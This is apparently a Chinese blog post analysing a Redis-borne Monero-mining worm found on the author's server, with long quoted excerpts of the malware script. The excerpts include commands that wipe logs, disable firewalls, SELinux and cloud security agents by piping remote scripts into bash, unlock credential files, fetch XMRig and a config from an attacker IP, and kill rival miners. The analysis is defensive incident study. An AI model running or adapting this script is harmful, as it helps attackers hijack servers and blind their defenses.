## 简介

最近发现服务器 CPU 占用极高, 一看是全是被 redis 吃满了.
网上搜索了一番, 原来是 redis 以 root 权限启动, 并且没有设置密码, 端口 6379 又暴露在公网上, 导致被人入侵给了.
具体的流程可以参考这篇文章[redis 入侵原理](https://juejin.cn/post/6844903863493853192)和
[Linux Redis 自动化挖矿感染蠕虫分析及安全建议](https://paper.seebug.org/605/).

## 脚本分析

这次遭遇的也是在 crontab 中写入定时任务, 执行了特定的脚本, 来看看这个脚本吧.

脚本有点长, 尽力分析下每段的作用. 很多命令也不知道什么意思, 推荐一个实用的网站 [explain shell](https://explainshell.com/).

## 正式开始分析

### 初出茅庐

```bash
#!/bin/bash
ulimit -n 65535
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
ufw disable
iptables -F
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
```

第一步就是删除了系统日志, 关闭防火墙, 珊瑚了所有 iptables 的规则.
`nmi_watchdog=0` 禁用了检测系统是否失去响应.

`chattr` 是用来更改文件属性的, `i` 表示不得任意更动文件或目录, `u` 表示预防意外删除, `a` 表示只能使用 append 模式写入,
`e` 表示文件正在使用映射到硬盘上的块. `chattr` 有三个操作符号, `+` 表示加属性, `-` 表示去掉属性, `=` 表示替换现有属性.

```bash
if ps aux | grep -i '[a]liyun'; then
  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
```

这个脚本专门对国内的两大云服务厂商阿里云和腾讯云做了处理, 卸载了内置的安全组件.

```bash
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
```

然后继续关闭系统的安全服务, 包括 SELinux, apparmor 和阿里云的安骑士 aegis.

### 大展宏图

关闭安全服务之后, 病毒的野心就藏不住了, 开始干正式了.

```bash
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-linux-static-x64.tar.gz
miner_url_backup=https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-linux-static-x64.tar.gz
config_url=http://199.19.226.117/b2f628/cf.jpg
config_url_backup=http://199.19.226.117/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.dream
export MOHOME=/usr/share
mkdir $MOHOME -p
VERSION=2.9
```

用的挖矿软件是 XMRig, 挖的币是门罗 XMR.

> 在加密货币发烧友重视的功能列表中，隐私性往往很高。比特币是世界上第一种加密货币，它提供了一定程度的隐私，因为 BTC 地址似乎是数字和字符的随机字符串，并且没有附加真实的身份。但是，比特币的交易和余额分类账是完全透明的，并且配备了正确软件的熟练用户只需分析区块链，就可以了解很多关于比特币用户的知识。
>
> 门罗币属于“隐私硬币”类别-这些加密货币试图通过使追踪交易和余额变得异常困难，试图为用户提供尽可能多的隐私。就像其他任何加密货币一样，隐私硬币仍然需要有适当的机制来确保交易是合法的，并且不会发生重复消费。

门罗币隐藏了钱包余额和账单, 所以无法看到这个病毒作者的成果如何.

```bash
function FixTheSystem(){
tntrecht -i /bin/chmod || chattr -i /bin/chmod
setfacl -m u::x /bin/chmod
tntrecht -i /bin/chattr || chattr -i /bin/chattr
chmod +x /bin/chattr || setfacl -m u::x /bin/chattr

SYSFILEARRAY=(/usr/bin/apt  /usr/bin/apt-get /bin/yum  /bin/kill /usr/lib/klibc/bin/kill /usr/bin/pkill /bin/pkill /sbin/shutdown /sbin/reboot /sbin/poweroff /sbin/telinit)
for SYSFILEBIN in ${SYSFILEARRAY[@]}; do
tntrecht -i $SYSFILEBIN
chattr -i $SYSFILEBIN
setfacl -m u::x /bin/chmod
setfacl -m u::x $SYSFILEBIN
chmod +x $SYSFILEBIN
chattr +i $SYSFILEBIN
tntrecht +i $SYSFILEBIN
done


SYSTEMFILEARRAY=("/root/.ssh/" "/home/*/.ssh/" "/etc/passwd" "/etc/shadow" "/etc/sudoers" "/etc/ssh/" "/etc/ssh/sshd_config")
for SYSTEMFILE in ${SYSTEMFILEARRAY[@]}; do
tntrecht -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
chattr -iR $SYSTEMFILE  2>/dev/null 1>/dev/null
done

setfacl -m u::x /bin/chmod

}
```

不知道 `tntrecht` 有什么作用? 但从 `||` 来看, 似乎是 `chattr` 的替代品.

`setfacl -m u::x /bin/chmod` 给予其他用户执行 `/bin/chmod` 的权限.

### 战胜对手

```bash
kill_miner_proc()
{
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
pgrep -f xzpauectgr | xargs -I % kill -9 %
pgrep -f slxfbkmxtd | xargs -I % kill -9 %
pgrep -f mixtape | xargs -I % kill -9 %
pgrep -f addnj | xargs -I % kill -9 %
pgrep -f 200.68.17.196 | xargs -I % kill -9 %
pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
pgrep -f mqdsflm.cf | xargs -I % kill -9 %
pgrep -f lower.sh | xargs -I % kill -9 %
pgrep -f ./ppp | xargs -I % kill -9 %
pgrep -f cryptonight | xargs -I % kill -9 %
pgrep -f ./seervceaess | xargs -I % kill -9 %
pgrep -f ./servceaess | xargs -I % kill -9 %
pgrep -f ./servceas | xargs -I % kill -9 %
pgrep -f ./servcesa | xargs -I % kill -9 %
pgrep -f ./vsp | xargs -I % kill -9 %
pgrep -f ./jvs | xargs -I % kill -9 %
pgrep -f ./pvv | xargs -I % kill -9 %
pgrep -f ./vpp | xargs -I % kill -9 %
pgrep -f ./pces | xargs -I % kill -9 %
pgrep -f ./rspce | xargs -I % kill -9 %
pgrep -f ./haveged | xargs -I % kill -9 %
pgrep -f ./jiba | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
pgrep -f ./A7mA5gb | xargs -I % kill -9 %
pgrep -f kacpi_svc | xargs -I % kill -9 %
pgrep -f kswap_svc | xargs -I % kill -9 %
pgrep -f kauditd_svc | xargs -I % kill -9 %
pgrep -f kpsmoused_svc | xargs -I % kill -9 %
pgrep -f kseriod_svc | xargs -I % kill -9 %
pgrep -f kthreadd_svc | xargs -I % kill -9 %
pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
pgrep -f kintegrityd_svc | xargs -I % kill -9 %
pgrep -f jawa | xargs -I % kill -9 %
pgrep -f oracle.jpg | xargs -I % kill -9 %
pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
pgrep -f 188.209.49.54 | xargs -I % kill -9 %
pgrep -f 181.214.87.241 | xargs -I % kill -9 %
pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
pgrep -f servim | xargs -I % kill -9 %
pgrep -f kblockd_svc | xargs -I % kill -9 %
pgrep -f native_svc | xargs -I % kill -9 %
pgrep -f ynn | xargs -I % kill -9 %
pgrep -f 65ccEJ7 | xargs -I % kill -9 %
pgrep -f jmxx | xargs -I % kill -9 %
pgrep -f 2Ne80nA | xargs -I % kill -9 %
pgrep -f sysstats | xargs -I % kill -9 %
pgrep -f systemxlv | xargs -I % kill -9 %
pgrep -f watchbog | xargs -I % kill -9 %
pgrep -f OIcJi1m | xargs -I % kill -9 %
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
pkill -f devtool
pkill -f devtools
pkill -f systemctI
pkill -f watchbog
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
pkill -f 121.42.151.137
pkill -f init12.cfg
pkill -f nginxk
pkill -f tmp/wc.conf
pkill -f xmrig-notls
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f dbus-daemon--system
pkill -f nullcrew
pkill -f systemctI
pkill -f kworkerds
pkill -f init10.cfg
pkill -f /wl.conf
pkill -f crond64
pkill -f sustse
pkill -f vmlinuz
pkill -f exin
pkill -f apachiii
pkill -f svcworkmanager
pkill -f xr
pkill -f trace
pkill -f svcupdate
pkill -f networkmanager
pkill -f phpupdate
rm -rf /usr/bin/config.json
rm -rf /usr/bin/exin
rm -rf /tmp/wc.conf
rm -rf /tmp/log_rot
rm -rf /tmp/apachiii
rm -rf /tmp/sustse
rm -rf /tmp/php
rm -rf /tmp/p2.conf
rm -rf /tmp/pprt
rm -rf /tmp/ppol
rm -rf /tmp/javax/config.sh
rm -rf /tmp/javax/sshd2
rm -rf /tmp/.profile
rm -rf /tmp/1.so
rm -rf /tmp/kworkerds
rm -rf /tmp/kworkerds3
rm -rf /tmp/kworkerdssx
rm -rf /tmp/xd.json
rm -rf /tmp/syslogd
rm -rf /tmp/syslogdb
rm -rf /tmp/65ccEJ7
rm -rf /tmp/jmxx
rm -rf /tmp/2Ne80nA
rm -rf /tmp/dl
rm -rf /tmp/ddg
rm -rf /tmp/systemxlv
rm -rf /tmp/systemctI
rm -rf /tmp/.abc
rm -rf /tmp/osw.hb
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/.java
rm -rf /tmp/.omed
rm -rf /tmp/.tmpc
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/gates.lod
rm -rf /tmp/conf.n
rm -rf /tmp/devtool
rm -rf /tmp/devtools
rm -rf /tmp/fs
rm -rf /tmp/.rod
rm -rf /tmp/.rod.tgz
rm -rf /tmp/.rod.tgz.1
rm -rf /tmp/.rod.tgz.2
rm -rf /tmp/.mer
rm -rf /tmp/.mer.tgz
rm -rf /tmp/.mer.tgz.1
rm -rf /tmp/.hod
rm -rf /tmp/.hod.tgz
rm -rf /tmp/.hod.tgz.1
rm -rf /tmp/84Onmce
rm -rf /tmp/C4iLM4L
rm -rf /tmp/lilpip
rm -rf /tmp/3lmigMo
rm -rf /tmp/am8jmBP
rm -rf /tmp/tmp.txt
rm -rf /tmp/baby
rm -rf /tmp/.lib
rm -rf /tmp/systemd
rm -rf /tmp/lib.tar.gz
rm -rf /tmp/baby
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.mynews1234
rm -rf /tmp/a3e12d
rm -rf /tmp/.pt
rm -rf /tmp/.pt.tgz
rm -rf /tmp/.pt.tgz.1
rm -rf /tmp/go
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.tmpnewasss
rm -rf /tmp/java
rm -rf /tmp/go.sh
rm -rf /tmp/go2.sh
rm -rf /tmp/khugepageds
rm -rf /tmp/.censusqqqqqqqqq
rm -rf /tmp/.kerberods
rm -rf /tmp/kerberods
rm -rf /tmp/seasame
rm -rf /tmp/touch
rm -rf /tmp/.p
rm -rf /tmp/runtime2.sh
rm -rf /tmp/runtime.sh
rm -rf /dev/shm/z3.sh
rm -rf /dev/shm/z2.sh
rm -rf /dev/shm/.scr
rm -rf /dev/shm/.kerberods
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -f /tmp/kthrotlds
rm -f /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
rm /opt/atlassian/confluence/bin/1.sh
rm /opt/atlassian/confluence/bin/1.sh.1
rm /opt/atlassian/confluence/bin/1.sh.2
rm /opt/atlassian/confluence/bin/1.sh.3
rm /opt/atlassian/confluence/bin/3.sh
rm /opt/atlassian/confluence/bin/3.sh.1
rm /opt/atlassian/confluence/bin/3.sh.2
rm /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/f41
rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
